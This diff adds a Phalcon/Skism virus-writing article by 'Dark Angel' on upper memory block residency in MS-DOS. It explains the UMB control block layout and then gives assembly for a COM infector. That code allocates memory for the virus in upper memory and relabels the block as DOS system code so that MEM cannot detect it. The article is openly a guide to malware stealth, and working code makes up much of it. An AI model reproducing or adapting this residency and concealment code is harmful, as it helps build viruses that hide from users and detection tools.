@@ -1,0 +1,115 @@
+
+                             อออออออออออออ
+                             UMB Residency
+                             อออออออออออออ
+                             By Dark Angel
+                             Phalcon/Skism
+                             อออออออออออออ
+
+One day, while fiddling with loading programs into MSDOS UMB's, I realised
+that there are very few viruses that used UMB's. This is surprising, given
+the prevalence of UMB's and the ease with which DOS viruses may hide their
+presence through the use of UMB's.
+
+The UMB's, or upper memory blocks, consist of the memory above 640K and below
+1MB (segments A000 to FFFF). This region was reserved early on for BIOS and
+peripherals, notably video memory. There is normally plenty of unused space in
+this region, so enterprising programmers found a simple way to incorporate the
+memory into DOS's memory allocation scheme. They simply extended the MCB chain
+into that region, with MCB's indicating already allocated memory covering the
+memory used for other purposes by the machine. In this way, more memory,
+albeit fragmented, was usable for loading programs. The UMB's are especially
+handy for storing TSR's, since they have smaller memory constraints than most
+programs. The programmers at Microsoft, realising the utility of UMB's,
+decided to incorporate UMB's into DOS beginning at version 5, so now there is
+a standardised method of handling upper memory.
+
+The MCB's handling upper memory are slightly more complex than regular MCB's.
+The format of a UMB control block is:
+
+Offset  Size  Description
+  00    BYTE  'Z' if last MCB in chain, 'M' otherwise
+  01    WORD  PSP segment of owner (8 if MSDOS, 0 if free)
+  03    WORD  size of memory block in paragraphs
+  05  3 BYTES unused
+  08  8 BYTES program name in ASCII or
+              "SC" if system code or
+              "SD" if system data
+
+The method is pretty simple to understand and very easy to implement. In
+DOS 5+, the first UMB can be located through a pointer in the disk buffer
+information structure which, in turn, may be located through the DOS master
+list structure. This UMB is usually located at 9FFF:0000, but there is no need
+for this to be the case. It's simply the most convenient location for it. The
+only difference between modifying regular MCB's and UMB's is the extra field
+at offset 8 which may be used to mark the block as DOS system code. By marking
+this with DOS's usual fields to indicate unusuable memory such as video memory
+and ROM, we effectively hide the virus from detection by utilities such as
+MEM. Since it doesn't reside in conventional memory (below 640K), there is no
+decrease in memory a la 40:13 BIOS manipulating memory residency techniques.
+
+The sample code below, written for a simple COM infector, illustrates the
+technique.
+
+start:          xor     di,di
+
+                mov     ax,3306                 ; get true DOS version
+                int     21
+                inc     al                      ; DOS 4-?
+                jz      no_UMBs                 ; if so, we don't have UMB's
+
+                mov     ah,52                   ; get DOS master list
+                int     21                      ; structure
+
+                lds     si,es:[bx+12]           ; get ptr to disk buffer info
+
+                mov     ax,ds:[si+1f]           ; get address of the first UMB
+                inc     ax                      ; (FFFF if no UMBs present)
+                jz      no_UMBs
+                dec     ax                      ; undo damage from above
+search_chain:   mov     ds,ax                   ; go to the MCB
+                cmp     word ptr [di+1],di      ; unused?
+                jnz     search_next
+                cmp     word ptr [di+3],reslength_P ; MCB large enough to
+                ja      handle_MCB              ; hold us and our MCB?
+search_next:    cmp     byte ptr [di],'Z'       ; end of chain?
+                jz      no_UMBs
+                mov     bx,[di+3]               ; go to the next MCB
+                inc     ax                      ; 40Hex
+                add     ax,bx
+                jmp     search_chain
+
+no_UMBs:        mov     ax,cs
+                dec     ax                      ; get the MCB for current
+                mov     ds,ax                   ; program
+                cmp     word ptr [di+3],reslength_P + 1000 ; large enough for
+                jna     fail_init               ; program and virus and its
+                                                ; MCB?
+                jmp     short handle_MCB
+
+                db      0,'(DA/PS)',0
+
+handle_MCB:     sub     word ptr [di+3],reslength_P + 1 ; adjust size of memory
+                                                ; area for virus + its MCB
+                mov     bx,[di+3]               ; get size of new memory area
+                mov     cl,'M'                  ; make sure this MCB doesn't
+                xchg    cl,byte ptr [di]        ; mark the end of the chain
+                inc     ax
+                add     ax,bx                   ; go to virus segment's MCB
+                mov     ds,ax
+                mov     es,ax
+
+                mov     byte ptr [di],cl        ; patch end of chain indicator
+                mov     word ptr [di+1],8       ; mark MCB owned by DOS
+                mov     word ptr [di+3],reslength_P ; patch in virus size
+
+                inc     ax                      ; ds->virus segment
+                mov     ds,ax
+
+                or      di,8                    ; go to program name field
+                mov     ax,'CS'                 ; make virus invisible to MEM
+                stosw                           ; by pretending it is
+                xor     ax,ax                   ; DOS system code
+                stosw
+                stosw
+                stosw
